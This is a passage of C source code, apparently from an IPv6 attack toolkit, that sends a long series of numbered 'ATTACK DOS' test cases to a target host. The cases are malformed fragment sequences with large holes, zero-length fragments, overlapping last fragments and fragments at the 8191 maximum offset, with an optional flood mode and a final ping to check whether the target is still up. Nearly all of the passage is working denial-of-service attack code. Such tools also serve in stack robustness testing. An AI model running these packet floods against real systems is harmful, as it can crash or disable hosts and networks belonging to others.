      printf("  Sending second fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 175, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 175))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending third and final fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 350, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 808, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - sending first, middle and final frag with 4k holes in between\n", count);
      printf("  Sending first fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, ++tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      printf("  Sending second fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 550, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 175))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending third and final fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 1110, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 808, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - sending first, middle and final frag with 16k holes in between\n", count);
      printf("  Sending first fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, ++tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      printf("  Sending second fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 2050, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 175))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending third and final fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 4100, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 808, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - one shot fragment without content\n", count);
      printf("  Sending one-shot fragment with 0 byte TCP data\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, ++tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      if (thc_add_data6(pkt3, &pkt_len3, NXT_TCP, buf, 0))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - one shot fragment with 1 byte content\n", count);
      printf("  Sending one-shot fragment with 1 byte TCP data\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, ++tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      if (thc_add_data6(pkt3, &pkt_len3, NXT_TCP, buf, 1))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - last fragment has offset 0 and no data\n", count);
      printf("  Sending first fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending second fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending third and final fragment with offset 0\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
//  memcpy(buf, hdr->pkt + 40 + 14 -14*rawmode, 1);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 0))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - last fragment has offset 0\n", count);
      printf("  Sending first fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending second fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending third and final fragment with offset 0\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 1);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 1))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - last fragment has offset 1\n", count);
      printf("  Sending first fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending second fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 400 + 8, 400);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 400))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending third and final fragment with offset 1\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, 0, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 1, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode + 8, 1);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 1))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - last fragment at 8191 + 7 bytes\n", count);
      printf("  Sending first fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, ++tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
//  memcpy(buf, hdr->pkt + 40 + 14 -14*rawmode + 400 + 8, 1452);
      memset(buf, 'A', sizeof(buf));
      printf("  Sending fragments 2-44\n");
      for (i = 0; i < 44; i++) {
        pkt3 = thc_destroy_packet(pkt3);
        hdr = (thc_ipv6_hdr *) pkt;
        if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
          return -1;
        if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51 + i * 181, 1, 0xdead0000 + getpid() + count + curr))
          return -1;
        if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 1448))
          return -1;
        thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);  // ignore
      }
      printf("  Sending fragment %d (preparation fragment)\n", i + 1);
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51 + 44 * 181, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 176 * 8))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending final fragment with 8191 and sending 7 bytes\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 8191, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 7))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - last fragment at 8191 + 8 bytes\n", count);
      printf("  Sending first fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, ++tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
//  memcpy(buf, hdr->pkt + 40 + 14 -14*rawmode + 400 + 8, 1452);
      memset(buf, 'A', sizeof(buf));
      printf("  Sending fragments 2-44\n");
      for (i = 0; i < 44; i++) {
        pkt3 = thc_destroy_packet(pkt3);
        hdr = (thc_ipv6_hdr *) pkt;
        if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
          return -1;
        if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51 + i * 181, 1, 0xdead0000 + getpid() + count + curr))
          return -1;
        if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 1448))
          return -1;
        thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);  // ignore
      }
      printf("  Sending fragment %d (preparation fragment)\n", i + 1);
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51 + 44 * 181, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 176 * 8))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending final fragment with 8191 and sending 8 bytes\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 8191, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 8))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - last fragment at 8191 + 9 bytes\n", count);
      printf("  Sending first fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, ++tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
//  memcpy(buf, hdr->pkt + 40 + 14 -14*rawmode + 400 + 8, 1452);
      memset(buf, 'A', sizeof(buf));
      printf("  Sending fragments 2-44\n");
      for (i = 0; i < 44; i++) {
        pkt3 = thc_destroy_packet(pkt3);
        hdr = (thc_ipv6_hdr *) pkt;
        if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
          return -1;
        if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51 + i * 181, 1, 0xdead0000 + getpid() + count + curr))
          return -1;
        if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 1448))
          return -1;
        thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);  // ignore
      }
      printf("  Sending fragment %d (preparation fragment)\n", i + 1);
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51 + 44 * 181, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 176 * 8))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending final fragment with 8191 and sending 9 bytes\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 8191, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 9))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }

  curr = 0;
  if (only == ++count || only == 0)
    while (curr < resend || flood) {
      printf("ATTACK DOS %d - last fragment at 8191 + 1452 bytes\n", count);
      printf("  Sending first fragment\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, ++tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 0, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      memcpy(buf, hdr->pkt + 40 + 14 - 14 * rawmode, 400 + 8);
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 408))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
//  memcpy(buf, hdr->pkt + 40 + 14 -14*rawmode + 400 + 8, 1452);
      memset(buf, 'A', sizeof(buf));
      printf("  Sending fragments 2-44\n");
      for (i = 0; i < 44; i++) {
        pkt3 = thc_destroy_packet(pkt3);
        hdr = (thc_ipv6_hdr *) pkt;
        if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
          return -1;
        if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51 + i * 181, 1, 0xdead0000 + getpid() + count + curr))
          return -1;
        if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 1448))
          return -1;
        thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);  // ignore
      }
      printf("  Sending fragment %d (preparation fragment)\n", i + 1);
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 51 + 44 * 181, 1, 0xdead0000 + getpid() + count + curr))
        return -1;
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 176 * 8))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      printf("  Sending final fragment with 8191 and sending 1452 bytes\n");
      pkt3 = thc_destroy_packet(pkt3);
      hdr = (thc_ipv6_hdr *) pkt;
      if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 64, 0, count, tos, 0)) == NULL)
        return -1;
      if (thc_add_hdr_fragment(pkt3, &pkt_len3, 8191, 0, 0xdead0000 + getpid() + count + curr))
        return -1;
      if (thc_add_data6(pkt3, &pkt_len3, NXT_ICMP6, buf, 1452))
        return -1;
      thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt3, &pkt_len3);    // ignore
      if (!flood)
        sleep(1);
      curr++;
    }


  printf("ATTACK finalisation\n");
  if (ping) {
    printf("  Sending final ping to %s\n", argv[optind + 1]);
    thc_ping6(interface, src6, dst6, 10, 1);
    sleep(1);
  }

  printf("ATTACK END\n");

  return 0;
}
